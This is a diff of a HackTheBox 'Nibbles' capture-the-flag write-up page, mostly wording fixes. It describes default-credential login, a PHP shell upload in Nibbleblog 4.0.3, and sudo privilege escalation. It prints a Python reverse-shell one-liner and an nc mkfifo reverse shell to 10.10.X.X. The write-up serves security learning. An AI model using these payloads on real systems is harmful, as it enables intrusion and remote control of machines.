@@ -1,4 +1,4 @@
-I"<h1 id="introductionnibbles">Introduction@Nibbles:~$</h1>
+I"�<h1 id="introductionnibbles">Introduction@Nibbles:~$</h1>
 
 <table>
   <thead>
@@ -44,7 +44,7 @@
 <ul>
   <li>Discovering the new host and scanning for open ports.</li>
   <li>Found <code class="language-plaintext highlighter-rouge">/nibbleblog/</code> in <strong>source code</strong>, and then used <code class="language-plaintext highlighter-rouge">gobuster</code> for searching directories.</li>
-  <li>Accessing <code class="language-plaintext highlighter-rouge">admin</code> page with <em>default</em> credentials as <code class="language-plaintext highlighter-rouge">admin:nibbles</code>.</li>
+  <li>Accessing <code class="language-plaintext highlighter-rouge">/nibbleblog/admin</code> page with <em>default</em> credentials as <code class="language-plaintext highlighter-rouge">admin:nibbles</code>.</li>
   <li>Got <code class="language-plaintext highlighter-rouge">User Shell</code> by uploading a PHP reverse shell.</li>
   <li>Escalated Privileges using <code class="language-plaintext highlighter-rouge">sudo -l</code> and then changed the content of a file which can be run as sudo.</li>
 </ul>
@@ -82,7 +82,7 @@
 <hr />
 <p><img src="/assets/img/nibbles-hackthebox/accessing-readme-7.png" alt="" /></p>
 
-<p>Accessing <code class="language-plaintext highlighter-rouge">/nibbleblog/admin</code>, I got an admin pannel for <em>Nibbleblog</em></p>
+<p>Accessing <code class="language-plaintext highlighter-rouge">/nibbleblog/admin</code>, I got an admin pannel for <em>Nibbleblog</em>.</p>
 
 <hr />
 <p><img src="/assets/img/nibbles-hackthebox/admin-area-access-9.png" alt="" /></p>
@@ -92,20 +92,20 @@
 <hr />
 <p><img src="/assets/img/nibbles-hackthebox/nibbles-admin-dashboard-10.png" alt="" /></p>
 
-<p>I googled about <code class="language-plaintext highlighter-rouge">Nibbleblog version 4.0.3</code> and found this <a href="https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/">blog</a></p>
+<p>I googled about <code class="language-plaintext highlighter-rouge">Nibbleblog version 4.0.3</code> and found this <a href="https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/">blog</a>.</p>
 
 <hr />
 <p><img src="/assets/img/nibbles-hackthebox/nibble-version-search-8.png" alt="" /></p>
 
-<p>Uploaded a single line <a href="https://www.grobinson.me/single-line-php-script-to-gain-shell/">php shell</a> and accessing it as mentioned in the above <code class="language-plaintext highlighter-rouge">blog</code>.</p>
+<p>Uploaded a single line <a href="https://www.grobinson.me/single-line-php-script-to-gain-shell/">php shell</a> and accessed it as mentioned in the above <code class="language-plaintext highlighter-rouge">blog</code>.</p>
 
 <hr />
 <p><img src="/assets/img/nibbles-hackthebox/single-line-php-shell-11.png" alt="" /></p>
 
-<p>Now to get a <code class="language-plaintext highlighter-rouge">reverse shell</code>, I captured the request on <em>burp repeater</em> and sent my <code class="language-plaintext highlighter-rouge">python</code> payload using <em>URL encoding</em>.
+<p>Now to get a <code class="language-plaintext highlighter-rouge">reverse shell</code>, I captured the request in <em>burp repeater</em> and sent my <code class="language-plaintext highlighter-rouge">python</code> payload with <em>URL encoding</em>.
 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Python Payload</a></p>
 
-<p><strong>Command</strong>: <em>python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.X.X”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“/bin/bash”)’</em></p>
+<p><strong>Command</strong>: <em>python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.X.X”,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“/bin/bash”)’</em></p>
 
 <hr />
 <p><img src="/assets/img/nibbles-hackthebox/got-user-shell-12.png" alt="" /></p>
@@ -115,22 +115,14 @@
 <hr />
 <p><img src="/assets/img/nibbles-hackthebox/sudo-l-14.png" alt="" /></p>
 
-<p>We can run <code class="language-plaintext highlighter-rouge">monitor.sh</code> as administrator, let’s access <strong>personalzip</strong> using the <code class="language-plaintext highlighter-rouge">unzip</code> command. and then replace <code class="language-plaintext highlighter-rouge">monitor.sh</code> with our own malicious <em>monitor.sh</em> and get <code class="language-plaintext highlighter-rouge">Root</code>.</p>
+<p>We can run <code class="language-plaintext highlighter-rouge">monitor.sh</code> as administrator, let’s access <strong>personal.zip</strong> using the <code class="language-plaintext highlighter-rouge">unzip</code> command and then replace <code class="language-plaintext highlighter-rouge">monitor.sh</code> with our own malicious <em>monitor.sh</em> to get <code class="language-plaintext highlighter-rouge">Root</code>.</p>
 
 <hr />
 <p><img src="/assets/img/nibbles-hackthebox/unzip-15.png" alt="" /></p>
 
 <p>Replacing <code class="language-plaintext highlighter-rouge">monitor.sh</code> with our infected <em>monitor.sh</em>.</p>
 
-<table>
-  <tbody>
-    <tr>
-      <td><strong>monitor.sh</strong>: *echo “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f</td>
-      <td>/bin/sh -i 2&gt;&amp;1</td>
-      <td>nc 10.10.X.X 8899 &gt;/tmp/f”*</td>
-    </tr>
-  </tbody>
-</table>
+<p><strong>monitor.sh</strong>: <code class="language-plaintext highlighter-rouge">echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.X.X 8899 &gt;/tmp/f"</code></p>
 
 <p>Transfering it via <code class="language-plaintext highlighter-rouge">wget command</code>.</p>
 
